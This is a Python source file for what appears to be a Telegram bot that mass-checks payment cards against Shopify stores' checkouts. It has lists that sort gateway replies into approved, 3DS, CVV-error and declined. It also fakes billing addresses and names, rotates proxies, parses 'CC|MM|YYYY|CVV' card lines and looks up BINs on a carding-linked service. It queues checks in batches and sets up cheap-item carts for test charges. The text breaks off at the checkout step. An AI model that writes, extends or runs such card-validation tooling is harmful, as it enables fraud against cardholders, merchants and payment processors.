__typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}lineComponents{...PurchaseOrderBundleLineComponent __typename}components{...PurchaseOrderLineComponent __typename}quantity{__typename...on PurchaseOrderMerchandiseQuantityByItem{items __typename}}recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}lineAmount{__typename amount currencyCode}__typename}__typename}tax{totalTaxAmountV2{__typename amount currencyCode}totalDutyAmount{amount currencyCode __typename}totalTaxAndDutyAmount{amount currencyCode __typename}totalAmountIncludedInTarget{amount currencyCode __typename}__typename}discounts{lines{...PurchaseOrderDiscountLineFragment __typename}__typename}legacyRepresentProductsAsFees totalSavings{amount currencyCode __typename}subtotalBeforeTaxesAndShipping{amount currencyCode __typename}legacySubtotalBeforeTaxesShippingAndFees{amount currencyCode __typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}dutiesIncluded tip{tipLines{amount{amount currencyCode __typename}__typename}__typename}hasOnlyDeferredShipping note{customAttributes{key value __typename}message __typename}shopPayArtifact{optIn{vaultPhone __typename}__typename}recurringTotals{fixedPrice{amount currencyCode __typename}fixedPriceCount interval intervalCount recurringPrice{amount currencyCode __typename}title __typename}checkoutTotalBeforeTaxesAndShipping{__typename amount currencyCode}checkoutTotal{__typename amount currencyCode}checkoutTotalTaxes{__typename amount currencyCode}subtotalBeforeReductions{__typename amount currencyCode}deferredTotal{amount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}dueAt subtotalAmount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}taxes{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}__typename}metafields{key namespace value valueType:type __typename}}fragment ProductVariantSnapshotMerchandiseDetails on ProductVariantSnapshot{variantId options{name value __typename}productTitle title productUrl untranslatedTitle untranslatedSubtitle sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}deferredAmount{amount currencyCode __typename}digest giftCard image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}price{amount currencyCode __typename}productId productType properties{...MerchandiseProperties __typename}requiresShipping sku taxCode taxable vendor weight{unit value __typename}__typename}fragment MerchandiseProperties on MerchandiseProperty{name value{...on MerchandisePropertyValueString{string:value __typename}...on MerchandisePropertyValueInt{int:value __typename}...on MerchandisePropertyValueFloat{float:value __typename}...on MerchandisePropertyValueBoolean{boolean:value __typename}...on MerchandisePropertyValueJson{json:value __typename}__typename}visible __typename}fragment DiscountDetailsFragment on Discount{...on CustomDiscount{title description presentationLevel allocationMethod targetSelection targetType signature signatureUuid type value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on CodeDiscount{title code presentationLevel allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on DiscountCodeTrigger{code __typename}...on AutomaticDiscount{presentationLevel title allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}fragment PurchaseOrderBundleLineComponent on PurchaseOrderBundleLineComponent{stableId merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}quantity recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}totalAmount{__typename amount currencyCode}__typename}fragment PurchaseOrderLineComponent on PurchaseOrderLineComponent{stableId componentCapabilities componentSource merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}quantity recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}totalAmount{__typename amount currencyCode}__typename}fragment PurchaseOrderDiscountLineFragment on PurchaseOrderDiscountLine{discount{...DiscountDetailsFragment __typename}lineAmount{amount currencyCode __typename}deliveryAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}merchandiseAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}__typename}
"""


success_keys = [
    "Thank you for your purchase!",
    "Order #",
    "Your order is confirmed",
    "CARD_SUCCEEDED",
    "CARD_APPROVED",
    "PaymentSucceeded",
    "PaymentApproved",
    "PaymentCompleted",
    "CARD_COMPLETED",
    "CARD_SUCCESS",
    "SucceededReceipt",
    "ApprovedReceipt",
    "CompletedReceipt",
    "succeeded",
    "redirect_url"
]

twofactor_keys = [
    "3d_secure_2",
    "hooks",
    "CERTIFICATE",
    "ActionRequiredReceipt"
]

ccn_keys = [
    "INCORRECT_CVC",
    "INVALID_CVC",
    "INVALID_CVV",
    "CVC",
    "CVV",
    "CSC",
    "PAYMENTS_CREDIT_CARD_CVV_INVALID",
    "PAYMENTS_CREDIT_CARD_CSC_INVALID",
    "PAYMENTS_CREDIT_CARD_SECURITY_CODE_INVALID"
]

fail_keys = [
    "CARD_DECLINED",
    "DECLINED",
    "RISKY",
    "GENERIC_ERROR",
    "INCORRECT_NUMBER",
    "PAYMENTS_CREDIT_CARD_NUMBER_INVALID_FORMAT",
    "FUNDING_ERROR",
    "PROCESSING_ERROR",
    "PAYMENTS_CREDIT_CARD_BASE_EXPIRED"
]


C2C = {
    "USD": "US",
    "CAD": "CA",
    "INR": "IN",
    "AED": "AE",
    "HKD": "HK",
    "GBP": "GB",
    "CHF": "CH",
}

book = {
    "US": {"address1": "123 Main", "city": "NY", "postalCode": "10080", "zoneCode": "NY", "countryCode": "US", "phone": "2194157586"},
    "CA": {"address1": "88 Queen", "city": "Toronto", "postalCode": "M5J2J3", "zoneCode": "ON", "countryCode": "CA", "phone": "4165550198"},
    "GB": {"address1": "221B Baker Street", "city": "London", "postalCode": "NW1 6XE", "zoneCode": "LND", "countryCode": "GB", "phone": "2079460123"},
    "IN": {"address1": "221B MG", "city": "Mumbai", "postalCode": "400001", "zoneCode": "MH", "countryCode": "IN", "phone": "+91 9876543210"},
    "AE": {"address1": "Burj Tower", "city": "Dubai", "postalCode": "", "zoneCode": "DU", "countryCode": "AE", "phone": "+971 50 123 4567"},
    "HK": {"address1": "Nathan 88", "city": "Kowloon", "postalCode": "", "zoneCode": "KL", "countryCode": "HK", "phone": "+852 5555 5555"},
    "CN": {"address1": "8 Zhongguancun Street", "city": "Beijing", "postalCode": "100080", "zoneCode": "BJ", "countryCode": "CN", "phone": "1062512345"},
    "CH": {"address1": "Gotthardstrasse 17", "city": "Schweiz", "postalCode": "6430", "zoneCode": "SZ", "countryCode": "CH", "phone": "445512345"},
    "AU": {"address1": "1 Martin Place", "city": "Sydney", "postalCode": "2000", "zoneCode": "NSW", "countryCode": "AU", "phone": "291234567"},
    "DEFAULT": {"address1": "123 Main", "city": "New York", "postalCode": "10080", "zoneCode": "NY", "countryCode": "US", "phone": "2194157586"},
}


# Helper functions
def pick_addr(url, cc=None, rc=None):
    cc = (cc or "").upper()
    rc = (rc or "").upper()
    dom = urlparse(url).netloc
    tcn = dom.split('.')[-1].upper()

    if tcn in book:
        return book[tcn]

    ccn = C2C.get(cc)

    if rc in book and ccn == rc:
        return book[rc]
    elif rc in book:
        return book[rc]
    return book["DEFAULT"]

def capture(data, first, last):
    try:
        start = data.index(first) + len(first)
        end = data.index(last, start)
        return data[start:end]
    except ValueError:
        return None

def extract_between(text, start, end):
    if not text or not start or not end:
        return None
    try:
        if start in text:
            parts = text.split(start, 1)
            if len(parts) > 1:
                if end in parts[1]:
                    result = parts[1].split(end, 1)[0]
                    return result if result else None
        return None
    except Exception:
        return None

class Utils:
    @staticmethod
    def get_random_name():
        first_names = ["James", "John", "Robert", "Michael", "William", "David", "Mary", "Patricia", "Jennifer", "Linda"]
        last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez"]
        return (random.choice(first_names), random.choice(last_names))
    
    @staticmethod
    def generate_email(first, last):
        domains = ["gmail.com", "yahoo.com", "outlook.com", "protonmail.com"]
        return f"{first.lower()}.{last.lower()}@{random.choice(domains)}"

def parse_proxy(proxy_str):
    if not proxy_str:
        return None

    proxy_str = proxy_str.strip()

    if proxy_str.startswith(("http://", "https://")):
        parsed = urlparse(proxy_str)
        if not parsed.hostname or not parsed.port:
            return None
        if parsed.username and parsed.password:
            return f"http://{parsed.username}:{parsed.password}@{parsed.hostname}:{parsed.port}"
        return f"http://{parsed.hostname}:{parsed.port}"

    parts = proxy_str.split(':')
    if len(parts) == 2:
        host, port = parts
        return f"http://{host}:{port}"
    if len(parts) == 4:
        host, port, user, password = parts
        return f"http://{user}:{password}@{host}:{port}"
    return None

def normalize_site_url(site_url):
    """Normalize site URL to scheme+host for stable storage/cache keys."""
    if not site_url:
        return site_url
    normalized = str(site_url).strip()
    if not normalized.startswith(('http://', 'https://')):
        normalized = f"https://{normalized}"
    parsed = urlparse(normalized)
    if not parsed.netloc:
        return normalized.rstrip('/')
    return f"{parsed.scheme or 'https'}://{parsed.netloc.lower()}".rstrip('/')

def validate_proxy_format(proxy_str):
    """Validate and normalize proxy format for storage."""
    if not proxy_str:
        return False, None, "Empty proxy"

    proxy_raw = str(proxy_str).strip()
    host = ""
    port = None
    username = None
    password = None

    try:
        if proxy_raw.startswith(("http://", "https://")):
            parsed = urlparse(proxy_raw)
            host = parsed.hostname or ""
            port = parsed.port
            username = parsed.username
            password = parsed.password
        else:
            parts = proxy_raw.split(':')
            if len(parts) == 2:
                host, port = parts[0].strip(), parts[1].strip()
            elif len(parts) == 4:
                host, port, username, password = [p.strip() for p in parts]
            else:
                return False, None, "Expected IP:PORT or IP:PORT:USER:PASS"

        if not host:
            return False, None, "Missing proxy host"

        if isinstance(port, str):
            if not port.isdigit():
                return False, None, "Invalid port"
            port = int(port)
        if not isinstance(port, int) or port < 1 or port > 65535:
            return False, None, "Port must be between 1 and 65535"

        if (username and not password) or (password and not username):
            return False, None, "Both username and password are required"

        if username and password:
            normalized = f"{host}:{port}:{username}:{password}"
        else:
            normalized = f"{host}:{port}"

        return True, normalized, None
    except Exception:
        return False, None, "Invalid proxy format"

async def validate_proxy_connection(proxy_str):
    """Validate that a proxy is reachable."""
    proxy = parse_proxy(proxy_str)
    if not proxy:
        return False, "Invalid proxy format"

    connector = aiohttp.TCPConnector(ssl=False)
    timeout = aiohttp.ClientTimeout(total=PROXY_VALIDATION_TIMEOUT)
    try:
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            async with session.get(PROXY_VALIDATION_URL, proxy=proxy) as resp:
                if resp.status == 200:
                    return True, "OK"
                return False, f"HTTP {resp.status}"
    except Exception as e:
        return False, f"Unreachable ({type(e).__name__})"

def is_captcha_required(response_text):
    if not response_text:
        return False
    
    indicators = [
        'CAPTCHA_REQUIRED',
        '"code":"CAPTCHA_REQUIRED"',
        "'code':'CAPTCHA_REQUIRED'",
        '"message":"CAPTCHA_REQUIRED"',
        'captcha required',
        'CAPTCHA CHALLENGE',
        'hcaptcha',
        'h-captcha'
    ]
    
    text_upper = response_text.upper()
    for indicator in indicators:
        if indicator.upper() in text_upper:
            return True
    return False

async def make_graphql_request_with_captcha_handling(
    session, graphql_url, params, headers, json_data,
    checkout_url, max_retries=1, solve_captcha=True
):
    original_variables = json_data.get('variables', {}).copy()
    
    for attempt in range(max_retries + 1):
        try:
            async with session.post(graphql_url, params=params, headers=headers, json=json_data) as response:
                response_text = await response.text()
                response_meta = {
                    'status': response.status,
                    'url': str(response.url),
                    'headers': dict(response.headers)
                }
            return response_meta, response_text, False
            
        except Exception as e:
            if attempt == max_retries:
                err_msg = f"{type(e).__name__}: {e}".strip()
                return None, (err_msg if err_msg else "Request exception"), False
            await asyncio.sleep(1)
    
    return response, response_text, False

async def fetch_products(domain, proxy_str=None):
    try:
        domain = normalize_site_url(domain)

        cache_key = domain.lower()
        cached_product = product_cache.get(cache_key)
        now_ts = time.time()
        if cached_product and cached_product.get("expires_at", 0) > now_ts:
            return dict(cached_product["data"])
        
        connector = aiohttp.TCPConnector(ssl=False)
        timeout = aiohttp.ClientTimeout(total=10)
        
        proxy = parse_proxy(proxy_str) if proxy_str else None
        
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            async with session.get(f"{domain}/products.json", proxy=proxy, timeout=10) as resp:
                if resp.status != 200:
                    return False, f"Site Error! Status: {resp.status}"
                text = await resp.text()
                if "shopify" not in text.lower():
                    return False, "Not Shopify!"

                result = (await resp.json())['products']
                if not result:
                    return False, "No Products!"

        min_price = float('inf')
        min_product = None

        for product in result:
            if not product.get('variants'):
                continue
            
            for variant in product['variants']:
                if not variant.get('available', True):
                    continue
                
                try:
                    price = variant.get('price', '0')
                    if isinstance(price, str):
                        price = float(price.replace(',', ''))
                    else:
                        price = float(price)

                    if price < min_price:
                        min_price = price
                        min_product = {
                            'site': domain,
                            'price': f"{price:.2f}",
                            'variant_id': str(variant['id']),
                            'link': f"{domain}/products/{product['handle']}"
                        }
                except (ValueError, TypeError, AttributeError):
                    continue
        
        if isinstance(min_product, dict) and min_product.get('variant_id'):
            product_cache[cache_key] = {
                "data": min_product,
                "expires_at": now_ts + PRODUCT_CACHE_TTL_SECONDS
            }
            return min_product
        else:
            return False, "No Valid Products"

    except aiohttp.ClientError as e:
        return False, f"Proxy Error: {str(e)}"
    except Exception as e:
        return False, f"error: {str(e)}"

def extract_clean_response(message):
    if not message:
        return "UNKNOWN_ERROR"
    
    message = str(message)
    
    patterns = [
        r'(PAYMENTS_[A-Z_]+)',
        r'(CARD_[A-Z_]+)',
        r'([A-Z]+_[A-Z]+_[A-Z_]+)',
        r'([A-Z]+_[A-Z_]+)',
        r'code["\']?\s*[:=]\s*["\']?([^"\',]+)["\']?',
        r'{"code":"([^"]+)"',
        r"'code':'([^']+)'"
    ]
    
    for pattern in patterns:
        matches = re.findall(pattern, message, re.IGNORECASE)
        for match in matches:
            if isinstance(match, tuple):
                match = match[0]
            if match and "_" in match and len(match) < 50:
                match = match.strip("{}:'\" ")
                return match
    
    words = message.split()
    if words:
        first_word = words[0]
        if "_" in first_word and first_word.isupper():
            return first_word
    
    return message[:50]

def normalize_response_text(response):
    """Normalize gateway response text to a stable, user-safe value."""
    if response is None:
        return "UNKNOWN_ERROR"

    text = str(response).strip()
    if not text or text.lower() in {"none", "null", "undefined"}:
        return "UNKNOWN_ERROR"

    # Keep response readable in Telegram and avoid malformed multiline blobs.
    text = re.sub(r"\s+", " ", text).strip()
    return text if text else "UNKNOWN_ERROR"

def sanitize_for_log(text):
    """Redact sensitive credentials from log strings."""
    if text is None:
        return ""
    value = str(text)
    # Redact URL credentials: http://user:pass@host:port -> http://***:***@host:port
    value = re.sub(r'((?:https?://))([^:/\s@]+):([^@\s/]+)@', r'\1***:***@', value)
    # Redact raw proxy credentials: host:port:user:pass -> host:port:***:***
    value = re.sub(r'(\b[^:\s]+:\d{2,5}):[^:\s]+:[^:\s]+', r'\1:***:***', value)
    return value

def should_retry_mchk_last_response(success, response_text):
    """Retry only transient/unfinished mass-check failures."""
    if success:
        return False

    response_upper = normalize_response_text(response_text).upper()
    retry_markers = [
        "REQUEST FAILED",
        "FAILED TO GET SESSION TOKEN",
        "NO DATA IN PROPOSAL RESPONSE",
        "SESSION IS NULL",
        "NEGOTIATE RETURNED NULL",
        "RESULT IS NULL",
        "EMPTY SUBMIT RESPONSE",
        "SUBMITSUCCESS BUT NO RECEIPT",
        "NO RECEIPT IN SUBMIT RESPONSE",
        "NO RECEIPT ID",
        "INVALID JSON IN SUBMIT RESPONSE",
        "ERROR PARSING SUBMIT",
        "CHANGE PROXY OR SITE",
        "MAX RETRIES EXCEEDED",
        "TIMEOUT",
        "CONNECTION",
        "DISCONNECTED"
    ]
    return any(marker in response_upper for marker in retry_markers)

def parse_cc_string(cc_string):
    parts = cc_string.split('|')
    if len(parts) != 4:
        raise ValueError("Invalid CC format. Use: CC|MM|YYYY|CVV")
    return {
        'cc': parts[0].strip(),
        'mes': parts[1].strip(),
        'ano': parts[2].strip(),
        'cvv': parts[3].strip()
    }

def parse_cc_from_any_line(line):
    """Extract and normalize CC data from mixed line formats."""
    if not line:
        return None

    text = str(line).strip()
    if not text:
        return None

    match = re.search(r'(\d{12,19})\D+(\d{1,2})\D+(\d{2,4})\D+(\d{3,4})', text)
    if not match:
        return None

    cc, mm, yy, cvv = match.groups()
    try:
        mm_i = int(mm)
    except ValueError:
        return None
    if mm_i < 1 or mm_i > 12:
        return None

    mm = f"{mm_i:02d}"
    if len(yy) == 2:
        yy = f"20{yy}"
    elif len(yy) != 4:
        return None

    if len(cvv) < 3 or len(cvv) > 4:
        return None

    return f"{cc}|{mm}|{yy}|{cvv}"

def get_default_bin_info(bin_number):
    return {
        "bin": bin_number,
        "brand": "UNKNOWN",
        "country": "UNKNOWN",
        "country_name": "UNKNOWN",
        "country_flag": "🏳️",
        "bank": "UNKNOWN",
        "level": "UNKNOWN",
        "type": "UNKNOWN"
    }

async def get_bin_info(bin_number):
    """Get BIN information asynchronously with cache."""
    now_ts = time.time()
    cached = bin_cache.get(bin_number)
    if cached and cached.get("expires_at", 0) > now_ts:
        return cached["data"]

    try:
        timeout = aiohttp.ClientTimeout(total=5)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(f"https://bins.antipublic.cc/bins/{bin_number}") as response:
                if response.status == 200:
                    data = await response.json()
                    bin_cache[bin_number] = {
                        "data": data,
                        "expires_at": now_ts + BIN_CACHE_TTL_SECONDS
                    }
                    return data
    except Exception:
        pass
    fallback = get_default_bin_info(bin_number)
    bin_cache[bin_number] = {
        "data": fallback,
        "expires_at": now_ts + BIN_CACHE_TTL_SECONDS
    }
    return fallback

def register_queued_tasks(user_id, count=1):
    if count <= 0:
        return
    counters = active_task_counters[user_id]
    counters['queued'] += count

def decrement_queued_tasks(user_id, count=1):
    if count <= 0:
        return
    counters = active_task_counters.get(user_id)
    if not counters:
        return
    counters['queued'] = max(0, counters['queued'] - count)
    if counters['queued'] <= 0 and counters['processing'] <= 0:
        active_task_counters.pop(user_id, None)

def mark_task_processing(user_id):
    counters = active_task_counters[user_id]
    if counters['queued'] > 0:
        counters['queued'] -= 1
    counters['processing'] += 1

def mark_task_done(user_id):
    counters = active_task_counters.get(user_id)
    if not counters:
        return
    if counters['processing'] > 0:
        counters['processing'] -= 1
    if counters['queued'] <= 0 and counters['processing'] <= 0:
        active_task_counters.pop(user_id, None)

def get_active_task_stats(user_id):
    counters = active_task_counters.get(user_id, {'queued': 0, 'processing': 0})
    queued = max(0, counters.get('queued', 0))
    processing = max(0, counters.get('processing', 0))
    return {
        "active_total": queued + processing,
        "active_queued": queued,
        "active_processing": processing
    }

def utcnow():
    return datetime.now(timezone.utc)

def set_db_unavailable(error):
    """Switch to memory fallback when DB is unreachable."""
    global DB_AVAILABLE, DB_ERROR_REASON
    DB_AVAILABLE = False
    DB_ERROR_REASON = str(error)

def get_memory_user_doc(user_id):
    user = mem_users.get(user_id)
    if not user:
        return None
    return dict(user)

def get_memory_site_doc(user_id):
    sites = mem_user_sites.get(user_id, [])
    if not sites:
        return None
    normalized = []
    for entry in sites:
        normalized.append(dict(entry) if isinstance(entry, dict) else entry)
    return {'user_id': user_id, 'sites': normalized}

def get_memory_all_user_site_docs():
    docs = []
    for uid, sites in mem_user_sites.items():
        normalized = []
        for entry in sites:
            normalized.append(dict(entry) if isinstance(entry, dict) else entry)
        docs.append({'user_id': uid, 'sites': normalized})
    return docs

def filter_sites_by_price_range(sites):
    """Keep only site entries with price in configured range."""
    filtered = []
    removed = 0
    for entry in sites or []:
        if not isinstance(entry, dict):
            removed += 1
            continue

        url = entry.get('url')
        if not url:
            removed += 1
            continue

        try:
            price = float(str(entry.get('price', '')).replace(',', '').strip())
        except Exception:
            removed += 1
            continue

        if price < MIN_SITE_PRODUCT_PRICE or price > MAX_SITE_PRODUCT_PRICE:
            removed += 1
            continue

        normalized_entry = dict(entry)
        normalized_entry['url'] = normalize_site_url(url)
        normalized_entry['price'] = f"{price:.2f}"
        filtered.append(normalized_entry)
    return filtered, removed

def remove_user_from_round_robin(user_id):
    if user_id not in pending_users_set:
        return
    pending_users_set.discard(user_id)
    try:
        pending_users_rr.remove(user_id)
    except ValueError:
        pass

def register_mchk_batch(user_id, batch_id, msg_id):
    user_active_mchk_batches[user_id].add(batch_id)
    mchk_batches[batch_id] = {
        'user_id': user_id,
        'msg_id': msg_id,
        'status': 'active',
        'created_at': time.time()
    }

def finalize_mchk_batch(batch_id):
    info = mchk_batches.get(batch_id)
    if not info:
        cancelled_mchk_batches.discard(batch_id)
        mchk_batch_captcha_cards.pop(batch_id, None)
        return
    user_id = info.get('user_id')
    if user_id in user_active_mchk_batches:
        user_active_mchk_batches[user_id].discard(batch_id)
        if not user_active_mchk_batches[user_id]:
            user_active_mchk_batches.pop(user_id, None)
    mchk_batches.pop(batch_id, None)
    cancelled_mchk_batches.discard(batch_id)
    mchk_batch_captcha_cards.pop(batch_id, None)

def cancel_user_mchk_batches(user_id, batch_ids=None):
    """Cancel mchk batches for user and remove queued tasks."""
    global pending_tasks_total

    active_for_user = set(user_active_mchk_batches.get(user_id, set()))
    if batch_ids is None:
        batch_ids = active_for_user
    else:
        batch_ids = set(batch_ids) & active_for_user
    if not batch_ids:
        return {'cancelled_batches': [], 'removed_pending': 0, 'msg_ids': []}

    for batch_id in batch_ids:
        cancelled_mchk_batches.add(batch_id)
        if batch_id in mchk_batches:
            mchk_batches[batch_id]['status'] = 'cancelled'
        user_active_mchk_batches[user_id].discard(batch_id)
    if user_id in user_active_mchk_batches and not user_active_mchk_batches[user_id]:
        user_active_mchk_batches.pop(user_id, None)

    removed_pending = 0
    user_queue = pending_user_tasks.get(user_id)
    if user_queue:
        kept_tasks = deque()
        for task in user_queue:
            if task.get('type') == 'mchk' and task.get('batch_id') in batch_ids:
                removed_pending += 1
            else:
                kept_tasks.append(task)

        if kept_tasks:
            pending_user_tasks[user_id] = kept_tasks
        else:
            pending_user_tasks.pop(user_id, None)
            remove_user_from_round_robin(user_id)

    if removed_pending:
        pending_tasks_total = max(0, pending_tasks_total - removed_pending)
        decrement_queued_tasks(user_id, removed_pending)

    msg_ids = [mchk_batches[b]['msg_id'] for b in batch_ids if b in mchk_batches and mchk_batches[b].get('msg_id') is not None]
    return {'cancelled_batches': list(batch_ids), 'removed_pending': removed_pending, 'msg_ids': msg_ids}

def add_batch_captcha_card(batch_id, cc_line):
    """Store CAPTCHA_REQUIRED card line for batch output file."""
    if not batch_id or not cc_line:
        return
    cards = mchk_batch_captcha_cards[batch_id]
    cards.append(cc_line)

async def send_batch_captcha_file(user_id, batch_id):
    """Send CAPTCHA_REQUIRED cards as txt for finished mchk batch."""
    cards = mchk_batch_captcha_cards.get(batch_id, [])
    if not cards:
        return

    file_path = f"captcha_required_{user_id}_{int(time.time())}.txt"
    try:
        async with aiofiles.open(file_path, 'w') as f:
            await f.write("\n".join(cards))
        await app.send_document(
            chat_id=user_id,
            document=file_path,
            caption=f"🧩 CAPTCHA_REQUIRED CCs: {len(cards)}"
        )
    except Exception as e:
        logger.error(f"Error sending CAPTCHA file for batch {batch_id}: {e}")
    finally:
        if os.path.exists(file_path):
            os.remove(file_path)

def get_user_enqueue_capacity(user_id):
    """Current enqueue capacity for a user and global pool."""
    global_left = MAX_TOTAL_PENDING_TASKS - pending_tasks_total
    user_left = MAX_PENDING_TASKS_PER_USER - len(pending_user_tasks.get(user_id, ()))
    return max(0, min(global_left, user_left))

def enqueue_user_task(task):
    """Queue task into fair per-user pending buffer."""
    global pending_tasks_total
    user_id = task.get('user_id')
    if user_id is None:
        return False, "Missing user_id"
    if pending_tasks_total >= MAX_TOTAL_PENDING_TASKS:
        return False, "System queue is full, try again later"

    user_queue = pending_user_tasks[user_id]
    if len(user_queue) >= MAX_PENDING_TASKS_PER_USER:
        return False, f"Per-user queue limit reached ({MAX_PENDING_TASKS_PER_USER})"

    user_queue.append(task)
    pending_tasks_total += 1

    if user_id not in pending_users_set:
        pending_users_rr.append(user_id)
        pending_users_set.add(user_id)
    return True, None

def dequeue_pending_task_round_robin():
    """Pop one task fairly across users in round-robin order."""
    global pending_tasks_total
    if not pending_users_rr:
        return None

    user_id = pending_users_rr.popleft()
    pending_users_set.discard(user_id)
    user_queue = pending_user_tasks.get(user_id)
    if not user_queue:
        pending_user_tasks.pop(user_id, None)
        return None

    task = user_queue.popleft()
    pending_tasks_total = max(0, pending_tasks_total - 1)

    if user_queue:
        pending_users_rr.append(user_id)
        pending_users_set.add(user_id)
    else:
        pending_user_tasks.pop(user_id, None)
    return task

async def fair_task_dispatcher():
    """Move tasks from fair pending queues into worker queue."""
    logger.info("Fair dispatcher started")
    while True:
        task = dequeue_pending_task_round_robin()
        if task is None:
            await asyncio.sleep(0.01)
            continue
        await TASK_QUEUE.put(task)

def should_update_progress(stats, force=False):
    """Throttle task progress edits to avoid Telegram flood and slowdowns."""
    checked = stats.get('checked', 0)
    total = stats.get('total', 0)
    if force or checked >= total:
        stats['last_update_checked'] = checked
        stats['last_update_at'] = time.time()
        return True

    now = time.time()
    last_checked = stats.get('last_update_checked', 0)
    last_update_at = stats.get('last_update_at', 0.0)
    if (checked - last_checked) >= PROGRESS_UPDATE_EVERY or (now - last_update_at) >= PROGRESS_UPDATE_MIN_INTERVAL:
        stats['last_update_checked'] = checked
        stats['last_update_at'] = now
        return True
    return False

async def get_cached_user_first_name(user_id):
    cached_name = user_name_cache.get(user_id)
    if cached_name:
        return cached_name
    first_name = 'User'
    if DB_AVAILABLE:
        try:
            user = await users_col.find_one({'user_id': user_id})
            first_name = user.get('first_name', 'User') if user else 'User'
        except Exception as e:
            set_db_unavailable(e)
            user = get_memory_user_doc(user_id)
            first_name = user.get('first_name', 'User') if user else 'User'
    else:
        user = get_memory_user_doc(user_id)
        first_name = user.get('first_name', 'User') if user else 'User'
    user_name_cache[user_id] = first_name
    return first_name

async def get_cached_user_display_name(user_id):
    cached_display = user_display_cache.get(user_id)
    if cached_display:
        return cached_display

    first_name = 'User'
    username = None
    if DB_AVAILABLE:
        try:
            user = await users_col.find_one({'user_id': user_id})
            if user:
                first_name = user.get('first_name', 'User')
                username = user.get('username')
        except Exception as e:
            set_db_unavailable(e)
            user = get_memory_user_doc(user_id)
            if user:
                first_name = user.get('first_name', 'User')
                username = user.get('username')
    else:
        user = get_memory_user_doc(user_id)
        if user:
            first_name = user.get('first_name', 'User')
            username = user.get('username')

    display_name = f"@{username}" if username else (first_name or 'User')
    user_display_cache[user_id] = display_name
    return display_name

async def test_site_connection(site_url, proxy_str=None):
    """Test if a site is working by trying to add to cart and get session token"""
    try:
        if not site_url.startswith('http'):
            site_url = f"https://{site_url}"
        
        # Get variant_id from site
        info = await fetch_products(site_url, proxy_str)
        if isinstance(info, tuple) and info[0] is False:
            return False, info[1], None
        
        variant_id = info['variant_id']
        
        connector = aiohttp.TCPConnector(ssl=False)
        timeout = aiohttp.ClientTimeout(total=20)
        proxy = parse_proxy(proxy_str) if proxy_str else None
        
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Accept': 'application/json, text/plain, */*',
                'Accept-Language': 'en-US,en;q=0.9',
                'Content-Type': 'application/json',
                'Origin': site_url,
                'Referer': site_url
            }
            
            # Add to cart
            cart_url = site_url + '/cart/add.js'
            cart_headers = {**headers, 'Content-Type': 'application/x-www-form-urlencoded'}
            async with session.post(cart_url, data=f'id={variant_id}&quantity=1', headers=cart_headers, proxy=proxy) as cart_resp:
                cart_status = cart_resp.status

            if cart_status != 200:
                return False, f"Cart failed: {cart_status}", None
            
            # Go to checkout
